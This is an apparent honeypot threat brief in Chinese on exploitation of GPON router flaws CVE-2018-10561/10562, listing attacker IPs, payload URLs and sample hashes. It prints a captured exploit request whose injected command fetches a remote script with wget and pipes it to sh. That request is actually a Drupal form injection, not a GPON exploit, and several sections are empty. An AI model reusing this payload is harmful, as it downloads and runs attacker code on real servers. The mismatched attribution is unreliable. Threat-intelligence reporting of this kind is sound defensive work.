---
layout:     post
title:      GPON Home Routers_RCE_漏洞利用简报
subtitle:   GPON Home Routers_RCE
date: 2018-05-20
author:     shenzhen_antiylabs
header-img: img/avatar-by.jpg
catalog: true
tags:
    - honeypot_event
---

# GPON Home Routers_RCE_漏洞利用简报

## 概述

2018/04/30，vpnMentor公布了
GPON 路由器的高危漏洞：验证绕过漏洞(CVE-2018-10561)和命令注入漏洞(CVE-2018-10562)。将这两个漏洞结合，只需要发送一个请求，就可以在
GPON路由器 上执行任意命令，从5月初开始，安天蜜网团队监控到大量此漏洞利用的流量，并捕获若干样本。

## 漏洞描述



## 捕获载荷

```
  POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 181
Content-Type: application/x-www-form-urlencoded
Host: 66.111.41.249
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=wget%20-qO%20-%20http%3A%2F%2F54.39.23.28%2F1sh%20%7C%20sh

```

## 	攻击IP及URL

189.130.201.116

189.134.20.212

187.149.23.237

189.130.29.29

189.152.236.174

187.175.41.123

<http://51.254.219.134/gpon.php>

<http://185.62.190.191/r>

## 样本

| **样本**                     | **MD5**                          |
| ---------------------------- | -------------------------------- |
| http://185.62.190.191/r      | a536f99aa4030efb5d44c0b4792f4e9b |
| http://185.62.190.191/arm    | d546bc209d315ae81869315e8d536f36 |
| http://185.62.190.191/mips   | 20deff5786a4769b219c304965559043 |
| http://185.62.190.191/mipsel | 21fa1dcc069309245a8aa1c142f112a3 |
| http://185.62.190.191/arm7   | 2adb540db754366a1aa04ccca7105c80 |

## 受影响范围







## 修复及防护建议







## 参考资料


